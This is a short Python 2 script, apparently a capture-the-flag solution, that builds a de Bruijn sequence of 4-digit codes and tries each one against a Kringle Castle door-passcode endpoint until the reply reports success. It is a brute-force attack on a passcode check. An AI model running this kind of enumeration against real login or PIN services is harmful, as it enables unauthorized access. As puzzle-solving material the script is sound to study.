#!/usr/bin/env python
import requests

def de_bruijn(k, n):
    """
    Code from https://en.wikipedia.org/wiki/De_Bruijn_sequence

    de Bruijn sequence for alphabet k
    and subsequences of length n.
    """
    try:
        # let's see if k can be cast to an integer;
        # if so, make our alphabet a list
        _ = int(k)
        alphabet = list(map(str, range(k)))

    except (ValueError, TypeError):
        alphabet = k
        k = len(k)

    a = [0] * k * n
    sequence = []

    def db(t, p):
        if t > n:
            if n % p == 0:
                sequence.extend(a[1:p + 1])
        else:
            a[t] = a[t - p]
            db(t + 1, p)
            for j in range(a[t - p] + 1, k):
                a[t] = j
                db(t + 1, t)
    db(1, 1)
    return "".join(alphabet[i] for i in sequence)


if __name__ == "__main__":

    k = n = 4
    seq = de_bruijn(k, n)
    url = "https://doorpasscoden.kringlecastle.com/checkpass.php?resourceId=&i="

    for i in xrange(len(seq) - n):
        r = requests.get(url + seq[i:i+n])
        if ('"success":true' in r.text):
            print "The sequence is: " + seq[i:i+n]
            exit()